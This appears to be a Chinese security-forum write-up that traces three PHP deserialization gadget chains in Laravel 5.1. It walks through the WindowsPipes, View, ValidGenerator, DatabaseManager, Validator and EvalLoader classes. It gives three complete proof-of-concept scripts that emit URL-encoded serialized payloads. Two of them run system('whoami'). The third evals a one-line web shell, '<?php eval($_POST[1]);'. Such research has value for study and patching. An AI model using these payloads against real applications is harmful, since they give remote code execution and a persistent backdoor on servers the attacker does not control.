0x00 准备
=======

使用composer拉一个laravel5.1的环境  
`composer create-project --prefer-dist laravel/laravel laravel5.1 "5.1.*"`  
配置路由 控制等不在叙述

0x01 RCE1
=========

先搜索`__destruct`方法  
在`WindowsPipes`类中`__destruct`方法可任意删除文件

![Pasted image 20220507090840.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-eeb9a594d716220f07c147e1c48e881b16381182.png)

这里调用到了`$this->removeFiles()`跟进查看

![Pasted image 20220507090919.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-442903f03e609a28e39cf2fd3cacd2412c5aefbc.png)

遍历了`$this->files`判断文件是否存在，然后删除文件。这里调用`__toString`  
全局搜索`__toString`  
在`View`类中`__toString`方法调用了`$this->render()`

![Pasted image 20220507092644.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b8301617a1b15b7e907529e5a0ea65c1f068c9cb.png)

跟进这个函数看看

![Pasted image 20220507092712.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6aae6f2b01b82855179e9067f80fea7dc9e9698e.png)

发现调用了`$this->renderContent()`  
跟进看看

![Pasted image 20220507092746.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-cedc4b520711b311bc8a53134feecf4b89cc834c.png)

这里调用了`$this->factory->incrementRender()`可以调用任意类的`__call`方法  
全局搜索`__call`方法  
在`ValidGenerator`类中`__call`方法需要控制参数达到RCE的目的

![Pasted image 20220507093012.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-896ceaf87a834f5e5d2e7ad96e92fb0cdb66e84d.png)

`$this->vaildator`可控，接下来我们只需要控制`$res`即可  
`$res = call_user_func_array(array($this->generator, $name), $arguments);`  
调用方式为任意类的函数方法，`$this->generator`可控，所以就代表了可以调用任意类的`__call`方法，我们只需要找到一个`__call`方法返回任何值即可。  
在`DefaultGenerator`类中`__call`方法可以返回任意值，

![Pasted image 20220507093336.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f0075bb04519bc32ee3c69ef83ffd69ac879ba3a.png)

接下来构造poc

```php
<?php
namespace Faker;
class DefaultGenerator{
    protected $default;
    public function __construct(){
        $this->default='whoami';
    }
}

namespace Faker;
class ValidGenerator{
    protected $generator;
    protected $validator;
    protected $maxRetries;
    public function __construct(){
        $this->maxRetries=1;
        $this->validator='system';
        $this->generator=new DefaultGenerator;
    }

}
namespace Illuminate\View;
use Faker\ValidGenerator;
class View{
    protected $factory;
    public function __construct(){
        $this->factory=new ValidGenerator;
    }
}

namespace Symfony\Component\Process\Pipes;
use Illuminate\View\View;
class WindowsPipes{
    private $files = array();
    public function __construct(){
        $this->files = array(new View());
    }
}
echo urlencode(serialize(new WindowsPipes()));
?>
```

成功RCE  
![Pasted image 20220507094734.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-bc33caa1169b7fb117567128808fa602cbd80ccc.png)

0x02 RCE2
=========

继续从`__call`方法寻找  
全局搜索`__calll`  
在`DatabaseManager`类中调用了`$this->connection()`

![Pasted image 20220507102553.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b3fa5b770738535127a9e73be5fbe6d9a7a497b1.png)

跟进`$this->connecttion()`

![Pasted image 20220507102635.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-51f7bc8cbac49cd1b06033b3220d97da2d61dc23.png)

通过`$this->parseConnectionName($name)`给`$name`赋值，跟进

![Pasted image 20220507112257.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c27cceb7ef1b433b45cade391dcc35b1a509af63.png)

通过`$this->getDefaultConnection()`给`$name`赋值,跟进  
直接返回了`$this->app['config']['database.default'];`

![Pasted image 20220507114947.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e3e32c6fec3d82da933a99a5b00be580be54a85c.png)

最后返回,

![Pasted image 20220507112353.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9cebf4ccdb5925ebb7a7c5ebdda3c403c29eb9ae.png)

跟进`endsWitch`

![Pasted image 20220507115414.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a55938665eec9e73dfbb742e4a9bf1fe6859b176.png)

传入的`$name`并不在传入的`['::read','::write']`中所以返回false  
最终返回了`[$name,null]` `$name`最终被传入的`$this->app['config']['database.default']`赋值  
当`$this->connections[$name]`不存在，执行`$this->makeConnection($name)`方法，跟进

![Pasted image 20220507102807.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-eece6453d9c14bdc754308c85a2c1c80e3008449.png)

发现`call_user_func`方法控制参数可达到RCE的目的，  
第二个参数`$config`，跟进`$this->getConfig()`看看返回值是什么

![Pasted image 20220507103102.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8907b20a81d9db14e31eb38fa3838665df5d9fcf.png)

通过`app['config']['database.connections']`赋值给`$connections`然后通过`Arr::get($connections, $name)`赋值给`$config`  
跟进`Arr::get`

![Pasted image 20220507110801.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a3a8e5595c2effce881a20c8eba48957b5fb7dd7.png)

传入的`$key`为`whoami`，所以直接返回了`system`  
相当于`$config=$this->app['config']['database.connections']['whoami']`  
第一个参数`$this->extensions[name]`赋值`call_user_func`

```php
<?php
namespace Illuminate\Database;
class DatabaseManager{
    protected $extensions = array();
    protected $app=array();
    public function __construct(){
        $this->extensions['whoami']='call_user_func';
        $this->app['config']['database.connections']=['whoami'=>'system'];
        $this->app['config']['database.default'] = 'whoami';
    }
}

namespace Illuminate\View;
use Illuminate\Database\DatabaseManager;
class View{
    protected $factory;
    public function __construct(){
        $this->factory=new DatabaseManager;
    }
}

namespace Symfony\Component\Process\Pipes;
use Illuminate\View\View;
class WindowsPipes{
    private $files = array();
    public function __construct(){
        $this->files = array(new View());
    }
}
echo urlencode(serialize(new WindowsPipes()));
?>
```

成功RCE

![Pasted image 20220507114759.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-999a8e7d198f63f65379667cd055dba924991b26.png)

0x03 RCE3
=========

继续从`__call`方法寻找  
全局搜索`__call`  
在`Validator`类中`__call`方法中满足`$this->extensions[$rule]`存在则调用`$this->callExtension`方法

![Pasted image 20220507152556.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9615314f8336e9243f4371e1f5e16fb97bc499d7.png)

跟进看一下

![Pasted image 20220507152631.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c2f69d37b91b59813c0703d6301880f60a48b775.png)

满足`$callback`是字符串则调用`$this->callClassBasedExtension()`，继续跟进`$this->callClassBasedExtension()`

![Pasted image 20220507152707.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d38894692e6c7265b62074da000b3c15d26c8e6a.png)

这里  
`call_user_func_array([$this->container->make($class), $method], $parameters);`  
只要控制`$this->container->make($class)`的返回值，就可以调用任意类的任意方法。  
全局搜索一下危险函数，如`eval`，`system`，`call_user_func`，`shell_exec`等  
运气比较好搜了一下`eval`便出了  
在`EvalLoader`类中存在`load`方法满足`class_exists($definition->getClassName(),false)===false`则调用了`eval`函数

![Pasted image 20220507171534.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ef240c8726757222c1db7c82abb6f42a77056a5e.png)

跟进一下`$definition->getCode()`看一下参数是否可控

![Pasted image 20220507171617.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-550285713f6e7ae7bf074367bce2afa3919c5cbb.png)

直接返回了`$this->code`参数便可控，  
调用`load`函数中，发现需要传参`MockDefinition $definition`，上面调用`__call`这一步就没有办法用了，因为没有传参。所以无法控制`$parameters`。所以这里换到了`ObjectStateToken`类中的`__toString`函数可以控制传参。

![Pasted image 20220507175526.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1cf569822c65490b15c61a176d0ce65c12b33996.png)

成功调用到了`EvalLoader`类中的`load`函数

![Pasted image 20220507175855.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8701054a208a52be61fd536bfc20612f2e2b63cb.png)

看一下`class_exists`的定义

![Pasted image 20220507180106.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-307e8537382d9d163cc0e5c9fb0d02e11683cc0e.png)

`$definition->getClassName()`返回一个没有定义的类即可。跟进查看

![Pasted image 20220507180217.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0839edc97508c9a0d47dbfa91d044ee01ef3c94b.png)

返回了`$this->config->getName()`让他去调用`__call`方法返回一个任意值即可。  
这里还利用`DefaultGenerator`类中的`__call`方法返回任意值，  
接下来控制`$definition->getCode()`，跟进查看一下

![Pasted image 20220507190749.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0daaf9fa7c2c20d1cad0c6ea4f96574ecb6f408b.png)

直接返回了`$this->code`直接赋值即可。  
构造poc

```php
<?php
namespace Mockery\Loader;
class EvalLoader{}

namespace Faker;
use Mockery\Loader\EvalLoader;
class DefaultGenerator{
    public $default;
    public function __construct(){
        $this->default=new EvalLoader;
    }
}
namespace Illuminate\Validation;
use Faker\DefaultGenerator;
class Validator{
    protected $extensions = [];
    protected $container;
    public function __construct(){
        $this->extensions['y']='huahua@load';
        $this->container=new DefaultGenerator;
    } 
}

namespace Mockery\Generator;
use Faker\DefaultGenerator;
class MockDefinition{
    protected $config;
    public function __construct(){
        $this->config=new DefaultGenerator;
        $this->config->default='huahua';
        $this->code='<?php eval($_POST[1]);';
    }
}

namespace Prophecy\Argument\Token;
use Illuminate\Validation\Validator;
use Mockery\Generator\MockDefinition;
class ObjectStateToken{
    private $util;
    private $value;
    public function __construct(){
        $this->util=new Validator;
        $this->value=new MockDefinition;
    }
}

namespace Symfony\Component\Process\Pipes;
use Prophecy\Argument\Token\ObjectStateToken;
class WindowsPipes{
    private $files = array();
    public function __construct(){
        $this->files = array(new ObjectStateToken());
    }
}
echo urlencode(serialize(new WindowsPipes()));
?>
```